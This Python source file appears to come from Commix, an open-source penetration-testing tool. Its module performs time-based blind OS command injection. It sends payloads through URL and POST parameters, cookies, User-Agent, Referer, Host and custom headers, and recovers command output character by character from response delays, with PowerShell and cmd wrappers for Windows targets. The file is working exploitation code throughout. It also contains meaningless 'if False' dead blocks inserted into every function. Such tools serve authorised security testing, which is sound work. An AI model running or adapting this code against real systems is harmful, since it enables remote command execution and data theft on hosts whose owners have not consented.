"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
import re
import sys
import time
import json
import string
import random
import base64
from src.thirdparty.six.moves import urllib as _urllib
from src.utils import menu
from src.utils import settings
from src.utils import common
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.core.injections.blind.techniques.time_based import tb_payloads
'\n The "time-based" injection technique on Blind OS Command Injection.\n'
'\nExamine the GET/POST requests\n'

def examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response):
    if False:
        while True:
            i = 10
    start = 0
    end = 0
    start = time.time()
    if not settings.USER_DEFINED_POST_DATA:
        target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
        vuln_parameter = ''.join(vuln_parameter)
        request = _urllib.request.Request(target)
    else:
        parameter = menu.options.data
        parameter = parameters.do_POST_check(parameter, http_request_method)
        parameter = ''.join((str(e) for e in parameter)).replace('+', '%2B')
        if settings.IS_JSON:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace('"', '\\"')))
            try:
                data = checks.json_data(data)
            except ValueError:
                pass
        elif settings.IS_XML:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
        else:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
        request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC))
    headers.do_check(request)
    response = requests.get_request_response(request)
    end = time.time()
    how_long = int(end - start)
    return how_long
'\nCheck if target host is vulnerable.\n'

def injection_test(payload, http_request_method, url):
    if False:
        i = 10
        return i + 15
    start = 0
    end = 0
    start = time.time()
    if not settings.USER_DEFINED_POST_DATA:
        vuln_parameter = parameters.vuln_GET_param(url)
        target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
        request = _urllib.request.Request(target)
    else:
        parameter = menu.options.data
        parameter = parameters.do_POST_check(parameter, http_request_method)
        parameter = ''.join((str(e) for e in parameter)).replace('+', '%2B')
        vuln_parameter = parameters.vuln_POST_param(parameter, url)
        if settings.IS_JSON:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace('"', '\\"')))
            try:
                data = checks.json_data(data)
            except ValueError:
                pass
        elif settings.IS_XML:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
        else:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
        request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC))
    headers.do_check(request)
    response = requests.get_request_response(request)
    end = time.time()
    how_long = int(end - start)
    return (how_long, vuln_parameter)
'\nCheck if target host is vulnerable. (Cookie-based injection)\n'

def cookie_injection_test(url, vuln_parameter, payload):
    if False:
        while True:
            i = 10
    return requests.cookie_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (User-Agent-based injection)\n'

def user_agent_injection_test(url, vuln_parameter, payload):
    if False:
        i = 10
        return i + 15
    return requests.user_agent_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (Referer-based injection)\n'

def referer_injection_test(url, vuln_parameter, payload):
    if False:
        i = 10
        return i + 15
    return requests.referer_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (Host-based injection)\n'

def host_injection_test(url, vuln_parameter, payload):
    if False:
        for i in range(10):
            print('nop')
    return requests.host_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (Custom header injection)\n'

def custom_header_injection_test(url, vuln_parameter, payload):
    if False:
        return 10
    return requests.custom_header_injection(url, vuln_parameter, payload)
'\nThe main command injection exploitation.\n'

def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
    if False:
        i = 10
        return i + 15
    if settings.TARGET_OS == settings.OS.WINDOWS:
        previous_cmd = cmd
        if alter_shell:
            cmd = settings.WIN_PYTHON_INTERPRETER + ' -c "import os; print len(os.popen(\'cmd /c ' + cmd + '\').read().strip())"'
        else:
            cmd = 'powershell.exe -InputFormat none write-host ([string](cmd /c ' + cmd + ')).trim().length'
    if menu.options.file_write or menu.options.file_upload:
        minlen = 0
    else:
        minlen = 1
    found_chars = False
    info_msg = 'Retrieving the length of execution output. '
    print(settings.print_info_msg(info_msg))
    for output_length in range(int(minlen), int(maxlen)):
        if alter_shell:
            payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
        else:
            payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)
        payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
        payload = checks.perform_payload_modification(payload)
        if settings.VERBOSITY_LEVEL != 0:
            payload_msg = payload.replace('\n', '\\n')
            print(settings.print_payload(payload_msg))
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
            how_long = cookie_injection_test(url, vuln_parameter, payload)
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
            how_long = user_agent_injection_test(url, vuln_parameter, payload)
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
            how_long = referer_injection_test(url, vuln_parameter, payload)
        elif menu.options.host and settings.INJECT_TAG in menu.options.host:
            how_long = host_injection_test(url, vuln_parameter, payload)
        elif settings.CUSTOM_HEADER_INJECTION:
            how_long = custom_header_injection_test(url, vuln_parameter, payload)
        else:
            how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
        injection_check = False
        if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
            injection_check = True
        if injection_check == True:
            if output_length > 1:
                if settings.VERBOSITY_LEVEL != 0:
                    debug_msg = 'Retrieved the length of execution output: ' + str(output_length)
                    print(settings.print_bold_debug_msg(debug_msg))
                else:
                    sub_content = 'Retrieved: ' + str(output_length)
                    print(settings.print_sub_content(sub_content))
            found_chars = True
            injection_check = False
            break
    if found_chars == True:
        if settings.TARGET_OS == settings.OS.WINDOWS:
            cmd = previous_cmd
        num_of_chars = output_length + 1
        check_start = 0
        check_end = 0
        check_start = time.time()
        output = []
        percent = '0.0%'
        info_msg = 'Presuming the execution output.'
        if settings.VERBOSITY_LEVEL == 0:
            info_msg += '.. (' + str(percent) + ')'
        else:
            info_msg += '\n'
        if output_length > 1:
            sys.stdout.write('\r' + settings.print_info_msg(info_msg))
            sys.stdout.flush()
        for num_of_chars in range(1, int(num_of_chars)):
            char_pool = checks.generate_char_pool(num_of_chars)
            for ascii_char in char_pool:
                if alter_shell:
                    payload = tb_payloads.get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
                else:
                    payload = tb_payloads.get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
                payload = parameters.prefixes(payload, prefix)
                payload = parameters.suffixes(payload, suffix)
                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
                payload = checks.perform_payload_modification(payload)
                if settings.VERBOSITY_LEVEL != 0:
                    payload_msg = payload.replace('\n', '\\n')
                    print(settings.print_payload(payload_msg))
                if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
                    how_long = cookie_injection_test(url, vuln_parameter, payload)
                elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
                    how_long = user_agent_injection_test(url, vuln_parameter, payload)
                elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
                    how_long = referer_injection_test(url, vuln_parameter, payload)
                elif menu.options.host and settings.INJECT_TAG in menu.options.host:
                    how_long = host_injection_test(url, vuln_parameter, payload)
                elif settings.CUSTOM_HEADER_INJECTION:
                    how_long = custom_header_injection_test(url, vuln_parameter, payload)
                else:
                    how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
                injection_check = False
                if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
                    injection_check = True
                if injection_check == True:
                    if settings.VERBOSITY_LEVEL == 0:
                        output.append(chr(ascii_char))
                        percent = num_of_chars * 100 / output_length
                        float_percent = str('{0:.1f}'.format(round(num_of_chars * 100 / (output_length * 1.0), 2))) + '%'
                        if percent == 100:
                            float_percent = settings.info_msg
                        else:
                            float_percent = '.. (' + str(float_percent) + ')'
                        info_msg = 'Presuming the execution output.'
                        info_msg += float_percent
                        sys.stdout.write('\r' + settings.print_info_msg(info_msg))
                        sys.stdout.flush()
                    else:
                        output.append(chr(ascii_char))
                    injection_check = False
                    break
        check_end = time.time()
        check_how_long = int(check_end - check_start)
        output = ''.join((str(p) for p in output))
        if output == len(output) * settings.SINGLE_WHITESPACE:
            output = ''
    else:
        check_start = 0
        check_how_long = 0
        output = ''
    return (check_how_long, output)
'\nFalse Positive check and evaluation.\n'

def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response, false_positive_warning):
    if False:
        return 10
    if settings.TARGET_OS == settings.OS.WINDOWS:
        previous_cmd = cmd
        if alter_shell:
            cmd = settings.WIN_PYTHON_INTERPRETER + ' -c "import os; print len(os.popen(\'cmd /c ' + cmd + '\').read().strip())"'
        else:
            cmd = 'powershell.exe -InputFormat none write-host ([string](cmd /c ' + cmd + ')).trim().length'
    found_chars = False
    checks.check_for_false_positive_result(false_positive_warning)
    if false_positive_warning:
        timesec = timesec + random.randint(3, 5)
    if settings.VERBOSITY_LEVEL == 0:
        sys.stdout.write('.')
    for output_length in range(1, 3):
        if settings.VERBOSITY_LEVEL == 0:
            sys.stdout.write('.')
        if alter_shell:
            payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
        else:
            payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)
        payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
        payload = checks.perform_payload_modification(payload)
        if settings.VERBOSITY_LEVEL != 0:
            payload_msg = payload.replace('\n', '\\n')
            print(settings.print_payload(payload_msg))
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
            how_long = cookie_injection_test(url, vuln_parameter, payload)
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
            how_long = user_agent_injection_test(url, vuln_parameter, payload)
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
            how_long = referer_injection_test(url, vuln_parameter, payload)
        elif menu.options.host and settings.INJECT_TAG in menu.options.host:
            how_long = host_injection_test(url, vuln_parameter, payload)
        elif settings.CUSTOM_HEADER_INJECTION:
            how_long = custom_header_injection_test(url, vuln_parameter, payload)
        else:
            how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
        if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
            found_chars = True
            break
    if found_chars == True:
        if settings.TARGET_OS == settings.OS.WINDOWS:
            cmd = previous_cmd
        num_of_chars = output_length + 1
        check_start = 0
        check_end = 0
        check_start = time.time()
        output = []
        percent = 0
        sys.stdout.flush()
        is_valid = False
        for num_of_chars in range(1, int(num_of_chars)):
            for ascii_char in range(1, 20):
                if settings.VERBOSITY_LEVEL == 0:
                    sys.stdout.write('.')
                if alter_shell:
                    payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
                else:
                    payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
                payload = parameters.prefixes(payload, prefix)
                payload = parameters.suffixes(payload, suffix)
                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
                payload = checks.perform_payload_modification(payload)
                if settings.VERBOSITY_LEVEL != 0:
                    payload_msg = payload.replace('\n', '\\n')
                    print(settings.print_payload(payload_msg))
                if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
                    how_long = cookie_injection_test(url, vuln_parameter, payload)
                elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
                    how_long = user_agent_injection_test(url, vuln_parameter, payload)
                elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
                    how_long = referer_injection_test(url, vuln_parameter, payload)
                elif menu.options.host and settings.INJECT_TAG in menu.options.host:
                    how_long = host_injection_test(url, vuln_parameter, payload)
                elif settings.CUSTOM_HEADER_INJECTION:
                    how_long = custom_header_injection_test(url, vuln_parameter, payload)
                else:
                    how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
                if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
                    output.append(ascii_char)
                    is_valid = True
                    break
            if is_valid:
                break
        check_end = time.time()
        check_how_long = int(check_end - check_start)
        output = ''.join((str(p) for p in output))
        if str(output) == str(randvcalc):
            if settings.VERBOSITY_LEVEL == 0:
                sys.stdout.write(' (done)')
            return (how_long, output)
    else:
        checks.unexploitable_point()
'\nExport the injection results\n'

def export_injection_results(cmd, separator, output, check_how_long):
    if False:
        return 10
    if output != '' and check_how_long != 0:
        if settings.VERBOSITY_LEVEL == 0:
            print(settings.SINGLE_WHITESPACE)
        info_msg = 'Finished in ' + time.strftime('%H:%M:%S', time.gmtime(check_how_long)) + '.'
        print(settings.print_info_msg(info_msg))
        print(settings.print_output(output))
    elif output != False:
        err_msg = "It appears that '" + cmd + "' command could not return "
        err_msg += "any output due to '" + separator + "' filtration on target host. "
        err_msg += "To bypass that limitation, use the '--alter-shell' option "
        err_msg += 'or try another injection technique (i.e. \'--technique="f"\')'
        print('\n' + settings.print_critical_msg(err_msg))
        raise SystemExit()
    else:
        err_msg = common.invalid_cmd_output(cmd)
        print(settings.print_error_msg(err_msg))